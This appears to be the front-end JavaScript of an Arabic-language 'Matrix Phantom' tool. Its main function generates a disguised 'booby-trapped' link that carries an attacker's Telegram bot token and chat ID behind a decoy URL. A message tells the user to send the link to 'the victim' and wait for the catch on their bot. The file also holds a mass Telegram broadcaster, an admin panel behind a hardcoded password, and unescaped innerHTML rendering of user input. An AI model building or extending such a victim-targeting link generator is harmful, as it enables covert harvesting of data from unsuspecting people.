// --- MATRIX PHANTOM API PRO (V2) ---

// 1. توليد اللينك الملغم (مجاني واحترافي)
function generatePhantomLink() {
    const decoy = document.getElementById('decoy-url').value || "https://youtube.com";
    const botToken = document.getElementById('target-token').value.trim();
    const chatId = document.getElementById('target-chatid').value.trim();
    const payloadType = document.getElementById('payload-type').value;

    if (!botToken || !chatId) {
        return Swal.fire({ title: 'بيانات ناقصة', text: 'لازم تدخل توكن بوت التليجرام والـ Chat ID بتاعك الأول.', icon: 'error' });
    }

    // تشفير البيانات داخل اللينك (احترافي ومخفي)
    const payload = btoa(JSON.stringify({
        t: botToken,
        i: chatId,
        u: decoy,
        type: payloadType
    }));

    const finalLink = `${window.location.origin}/r.html?p=${payload}`;

    Swal.fire({
        title: 'تم توليد الرابط! 🔥',
        html: `<input type="text" value="${finalLink}" id="gen-url" readonly style="width:100%; padding:10px; background:#111; color:var(--neon); border:1px solid var(--neon); text-align:center;">`,
        confirmButtonText: 'نسخ الرابط'
    }).then(() => {
        const input = document.getElementById('gen-url');
        input.select();
        document.execCommand('copy');
        Swal.fire('تم النسخ', 'الآن أرسله للضحية وانتظر الصيد على بوتك الخاص!', 'success');
    });
}

// 2. إرسال اقتراح للأدمن الماستر
function submitSuggestion() {
    const text = document.getElementById('suggestion-text').value;
    const myID = localStorage.getItem('m_id_user') || 'Anonymous';

    if (!text) return Swal.fire('خطأ', 'اكتب الاقتراح الأول', 'error');

    Swal.fire('جاري الإرسال...', '', 'info');

    // تسجيل الاقتراح في Firebase للأدمن الماستر
    db.ref('suggestions').push({
        userId: myID,
        suggestion: text,
        time: new Date().toLocaleString()
    }).then(() => {
        document.getElementById('suggestion-text').value = '';
        Swal.fire('تم الإرسال ✅', 'شكراً لاقتراحك.. سيتم مراجعته وتطوير المنصة.', 'success');
    });
}

// 3. كود الإرسال الجماعي الذكي (لآلاف البوتات)
async function startBroadcasting() {
    const adminToken = document.getElementById('broadcast-token').value.trim();
    const message = document.getElementById('broadcast-message').value;

    if (!adminToken || !message) return Swal.fire('خطأ', 'أدخل توكن بوت الأدمن والرسالة', 'error');

    Swal.fire('جاري الإعداد للإرسال... 📢', 'يتم جلب البوتات المسجلة الآن', 'info');

    try {
        // جلب جميع المستخدمين المسجلين
        const snap = await db.ref('users').once('value');
        const users = snap.val();
        
        if (!users) return Swal.fire('لا يوجد مستخدمين', 'لا يوجد أي بوتات مسجلة حالياً لإرسال الرسالة لها.', 'warning');

        const userIds = Object.keys(users);
        let successCount = 0;
        let failCount = 0;

        Swal.fire({
            title: `بدء الإرسال لـ ${userIds.length} مستخدم`,
            text: 'يتم الإرسال بالتدريج لتجنب حظر البوت.. لا تغلق الصفحة.',
            icon: 'info',
            showConfirmButton: false,
            timer: 2000
        });

        // حلقة ذكية للإرسال بالراحة (Smart Throttling)
        for (let i = 0; i < userIds.length; i++) {
            const userId = userIds[i];
            // محاولة إرسال رسالة لمعرف شات المستخدم (Chat ID)
            try {
                // تليجرام يقبل حوالي 30 رسالة في الثانية، سنضيف تأخير بسيط
                await new Promise(res => setTimeout(res, 50)); // تأخير 50 مللي ثانية بين كل رسالة

                const response = await fetch(`https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(message)}`);
                if (response.ok) { successCount++; } else { failCount++; }
            } catch (err) { failCount++; }
        }

        Swal.fire({
            title: 'تم الانتهاء بنجاح! 🎉',
            text: `تم الإرسال لـ ${successCount} مستخدم.\nفشل الإرسال لـ ${failCount} مستخدم.`,
            icon: 'success'
        });

    } catch (err) {
        console.error(err);
        Swal.fire('خطأ في الإرسال الجماعي', 'تأكد من إعدادات الـ Rules في Firebase وتوكن البوت', 'error');
    }
}

// 4. وظائف الأدمن السرية
let clickCount = 0;
function checkAdmin() {
    clickCount++;
    if(clickCount >= 5) {
        Swal.fire({ title: 'Admin Access', input: 'password', showCancelButton: true })
        .then((result) => {
            if (result.value === "01224815487") { // باسورد الأدمن الماستر
                document.getElementById('master-panel').style.display = 'block';
                loadAdminStats();
            } else if (result.value) { Swal.fire('خطأ', 'الباسورد غلط', 'error'); }
        });
        clickCount = 0;
    }
}

function closeAdmin() { document.getElementById('master-panel').style.display = 'none'; }

// تحديث الإحصائيات واستعراض الاقتراحات في لوحة الأدمن
function loadAdminStats() {
    // جلب الاقتراحات
    db.ref('suggestions').on('value', (snap) => {
        const list = document.getElementById('suggestions-list');
        list.innerHTML = ''; // مسح القديم
        const data = snap.val();
        if (data) {
            for (let key in data) {
                const sug = data[key];
                list.innerHTML += `<div style="border-bottom:1px solid #222; padding:8px; margin-bottom:5px;"><small style="color:var(--neon);">${sug.userId} - ${sug.time}:</small><br>${sug.suggestion}</div>`;
            }
        } else {
            list.innerHTML = '(لا توجد اقتراحات بعد)';
        }
    });
}
